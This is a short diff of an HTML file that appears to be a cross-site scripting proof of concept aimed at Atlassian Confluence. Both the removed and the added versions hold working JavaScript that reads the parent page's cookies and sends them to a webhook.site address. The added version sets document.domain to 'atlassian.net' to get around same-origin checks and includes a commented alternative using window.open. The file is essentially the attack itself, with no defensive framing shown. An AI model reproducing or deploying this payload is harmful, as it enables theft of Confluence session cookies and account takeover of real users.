@@ -1,3 +1,18 @@
-<script>
-window.parent.location = "javascript:fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?cookie='+document.cookie)";
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // 1. Bypass Same-Origin Policy
+    document.domain = 'atlassian.net';
+    
+    // 2. Capturar cookies do Confluence (parent)
+    var cookies = window.parent.document.cookie;
+    
+    // 3. Exfiltrar via window.location (bypass CSP)
+    window.location = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?exfiltrated_cookies=' + encodeURIComponent(cookies);
+    
+    // Alternativa: abrir em nova aba (se location não funcionar)
+    // window.open('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?exfiltrated_cookies=' + encodeURIComponent(cookies), '_blank');
+  </script>
+</body>
+</html>
